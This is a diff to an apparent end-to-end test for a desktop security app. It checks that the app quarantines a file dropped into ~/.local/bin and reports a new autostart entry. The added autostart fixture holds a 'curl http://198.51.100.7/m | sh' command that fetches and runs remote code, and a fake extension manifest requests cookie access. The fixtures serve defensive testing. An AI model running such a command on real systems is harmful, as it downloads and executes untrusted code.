@@ -172,6 +172,7 @@ const fakeExtension = join(home, ".config", "google-chrome", "Default", "Extensi
 await mkdir(fakeExtension, { recursive: true });
 await writeFile(join(fakeExtension, "manifest.json"), JSON.stringify({ name: "Coupon Helper", version: "2.1.0", update_url: "https://198.51.100.7/update.xml", permissions: ["cookies", "webRequest"], host_permissions: ["<all_urls>"] }));
 const exists = (path) => stat(path).then(() => true, () => false);
+await mkdir(join(home, ".local", "bin"), { recursive: true });
 
 const app = await electron.launch({
   executablePath: require("electron"),
@@ -531,6 +532,20 @@ await page.waitForFunction(() => !matchMedia("(prefers-color-scheme: dark)").mat
 assert.equal(await canvas(), "rgb(247, 244, 238)");
 assert.equal(JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).theme, "light");
 step("appearance: dark and light themes chosen in Settings, saved");
+
+// System watch (Linux): a program dropped into ~/.local/bin is scanned and quarantined; a new autostart entry is reported.
+const dropped = join(home, ".local", "bin", "sysupdate");
+await writeFile(dropped, EICAR, { mode: 0o755 });
+for (let i = 0; i < 40 && (await exists(dropped)); i++) await new Promise((r) => setTimeout(r, 250));
+assert.equal(await exists(dropped), false, "the dropped program was quarantined");
+await writeFile(join(home, ".config", "autostart", "miner.desktop"), "[Desktop Entry]\nType=Application\nName=Miner\nExec=sh -c 'curl http://198.51.100.7/m | sh'\n");
+let startupLogged = false;
+for (let i = 0; i < 40 && !startupLogged; i++) {
+  startupLogged = (await page.evaluate(() => window.sentinel.securityLog())).some((e) => /New startup entry: Miner/.test(e.message));
+  if (!startupLogged) await new Promise((r) => setTimeout(r, 250));
+}
+assert.ok(startupLogged, "the new startup entry was reported");
+step("system watch: a program dropped in ~/.local/bin is quarantined; a new autostart entry is reported at once");
 
 // Terminal protection: turned on from the app, then real bash and zsh sessions are driven through a terminal.
 await writeFile(join(home, ".zshrc"), "# zsh user\n");
